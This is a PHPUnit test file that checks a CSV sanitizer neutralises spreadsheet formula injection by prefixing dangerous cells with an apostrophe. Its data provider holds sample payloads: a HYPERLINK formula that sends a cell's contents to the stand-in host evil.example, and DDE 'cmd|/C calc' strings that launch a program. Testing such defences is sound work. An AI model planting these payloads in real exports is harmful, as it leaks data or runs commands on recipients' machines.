<?php

namespace Tests\Unit;

use App\Support\CsvSanitizer;
use PHPUnit\Framework\TestCase;

class CsvSanitizerTest extends TestCase
{
    /**
     * @return array<string, array{0: string}>
     */
    public static function dangerousPrefixes(): array
    {
        return [
            'formula' => ['=HYPERLINK("http://evil.example/?d="&A1)'],
            'plus' => ['+1+1'],
            'minus' => ['-2+3+cmd|" /C calc"!A1'],
            'at' => ['@SUM(1+1)'],
            'tab' => ["\tsneaky"],
            'carriage return' => ["\rsneaky"],
        ];
    }

    /**
     * @dataProvider dangerousPrefixes
     */
    public function test_a_dangerous_value_is_quoted(string $value): void
    {
        $this->assertSame("'".$value, CsvSanitizer::cell($value));
    }

    public function test_ordinary_text_passes_through_unchanged(): void
    {
        $this->assertSame('Fix the login bug', CsvSanitizer::cell('Fix the login bug'));
    }

    public function test_a_minus_sign_in_the_middle_is_left_alone(): void
    {
        $this->assertSame('12-34', CsvSanitizer::cell('12-34'));
    }

    public function test_null_and_non_strings_pass_through_unchanged(): void
    {
        $this->assertNull(CsvSanitizer::cell(null));
        $this->assertSame(42, CsvSanitizer::cell(42));
        $this->assertSame(3.5, CsvSanitizer::cell(3.5));
    }

    public function test_an_empty_string_passes_through_unchanged(): void
    {
        $this->assertSame('', CsvSanitizer::cell(''));
    }

    public function test_row_sanitizes_every_value_and_keeps_the_keys(): void
    {
        $row = CsvSanitizer::row([
            'project' => '=cmd|"/C calc"!A1',
            'hours' => '3,50',
            'user' => null,
        ]);

        $this->assertSame([
            'project' => "'=cmd|\"/C calc\"!A1",
            'hours' => '3,50',
            'user' => null,
        ], $row);
    }
}
